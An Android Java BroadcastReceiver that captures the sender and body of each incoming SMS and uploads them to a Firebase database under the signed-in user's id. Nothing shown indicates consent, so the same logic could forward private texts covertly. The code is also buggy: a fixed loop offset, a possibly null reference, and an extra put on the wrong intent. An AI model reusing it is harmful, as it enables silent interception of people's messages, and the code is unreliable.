package com.ola.raven.Broadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.ola.raven.Service.SmsService;


public class SmsReceiver extends BroadcastReceiver {
    // SmsManager class is responsible for all SMS related actions
    final SmsManager sms = SmsManager.getDefault();
    DatabaseReference mref;
    FirebaseAuth auth;
    private String uid;
    private final String TAG = this.getClass().getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent)
    {
        Bundle extras = intent.getExtras();

        String strMessage = "";

        if ( extras != null )
        {
            auth = FirebaseAuth.getInstance();
            if(auth.getCurrentUser() != null){
                uid =auth.getCurrentUser().getUid();
                mref = FirebaseDatabase.getInstance().getReference().child("Users").child(uid);
            }
            Object[] smsextras = (Object[]) extras.get( "pdus" );

            for ( int i = smsextras.length-4; i < smsextras.length; i++ )
            {
                SmsMessage smsmsg = SmsMessage.createFromPdu((byte[])smsextras[i]);

                String strMsgBody = smsmsg.getMessageBody().toString();
                String strMsgSrc = smsmsg.getOriginatingAddress();

                strMessage += "SMS from " + strMsgSrc + " \n " + strMsgBody;
                mref.child("sms").push().setValue(strMessage);
                Log.i(TAG, strMessage);
            }

        }
        Intent intents=new Intent(context,SmsService.class);
        intent.putExtra("data",strMessage);
        context.startService(intents);

    }
}
